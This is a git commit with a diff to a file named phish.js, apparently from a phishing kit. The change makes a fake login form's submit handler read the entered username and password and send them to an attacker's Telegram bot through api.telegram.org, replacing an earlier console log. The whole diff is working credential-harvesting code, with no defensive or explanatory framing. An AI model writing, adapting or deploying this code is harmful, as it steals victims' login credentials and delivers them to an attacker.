e15d0221c1f213c98554e843c48516d96f2eacd9
xbaysal11 <baisalbek.daniiarov@gmail.com>
2020-02-24 15:50:43 +0600

    ADD telegram api msg send

--- phish.js
+++ phish.js
@@ -1,7 +1,18 @@
-const phish = () => {
+const phish = (bot_token, chat_id) => {
+
     $('#submit-button').on('click', function() {
         let login = $('#username').val(),
-            pass = $('#password').val();
-        console.log(`${login}: ${pass}`);
+            pass = $('#password').val(),
+            msg = `------------------------------------------%0A
+Login:    ${login}%0A
+Pass :    ${pass}%0A
+------------------------------------------`,
+            xhr = new XMLHttpRequest();
+
+        xhr.open(
+            'POST',
+            `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&parse_mode=html&text=${msg}`
+        );
+        xhr.send();
     });
 };
